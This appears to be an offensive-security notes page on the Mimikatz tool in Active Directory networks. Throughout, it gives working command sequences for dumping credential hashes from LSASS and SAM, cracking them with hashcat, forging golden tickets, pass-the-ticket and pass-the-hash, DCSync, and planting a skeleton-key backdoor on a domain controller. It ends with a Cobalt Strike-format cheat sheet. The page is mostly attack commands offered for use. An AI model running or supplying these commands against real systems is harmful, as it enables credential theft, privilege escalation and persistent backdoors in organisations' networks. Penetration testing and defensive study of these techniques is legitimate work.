# MimiKatz

_Used for dumping user credentials inside of a active directory network_

{% embed url="https://github.com/gentilkiwi/mimikatz" %}

**Summary**

* [Dumping Hashes](broken-reference)
* [Golden tickets attack](broken-reference)
* [Silver Ticket](broken-reference)
* [Pass the ticket](broken-reference)
* [Kerberos backdoors](broken-reference)

## Dumping hashes

`cd Downloads && mimikatz.exe` this will cd into the directory that mimikatz is kept as well as run the mimikatz binary&#x20;

`privilege::debug` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly&#x20;

`lsadump::lsa /patch` Dump those hashes!

Crack those hashes w/ hashcat

`hashcat -m 1000 <hash> rockyou.txt`

## Golden Tickets Attack

We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.

`cd downloads && mimikatz.exe`

`privilege::debug` ensure this outputs \[privilege "20" ok]

`lsadump::lsa /inject /name:krbtgt` This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

### Create golden ticket

`kerberos::golden /user: /domain: /sid: /krbtgt: /id:`&#x20;

### Access other machines with golden ticket

`misc::cmd` - This will open a new command prompt with elevated privileges to all machines&#x20;

Access other Machines! - You will now have another command prompt with access to all other machines on the network &#x20;

## Silver Ticket

If a password of a service account is stolen, it can be used to impersonate a user

## Pass the Ticket

Pass the ticket works by dumping the TGT from the LSASS memory of the machine.

`cd Downloads` - navigate to the directory mimikatz is in

`mimikatz.exe` - run mimikatz

`privilege::debug` - Ensure this outputs \[output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz&#x20;

`sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in

At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier

&#x20;Take the admin one

Now that we have the ticket, we can perform a pass the ticket attack `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket

`klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.&#x20;

You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.&#x20;

## Kerberos Backdoors

### Skeleton Key

The skeleton key works by abusing the AS-REQ encrypted timestamps, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.

`cd Downloads && mimikatz.exe` - Navigate to the directory mimikatz is in and run mimikatz

`privilege::debug` - This should be a standard for running mimikatz as mimikatz needs local administrator access

**Installing Skeleton Key**

`misc::skeleton`

**Accessing the forest** Example : `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password

`dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

## Commands - CheatSheet

```bash
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```
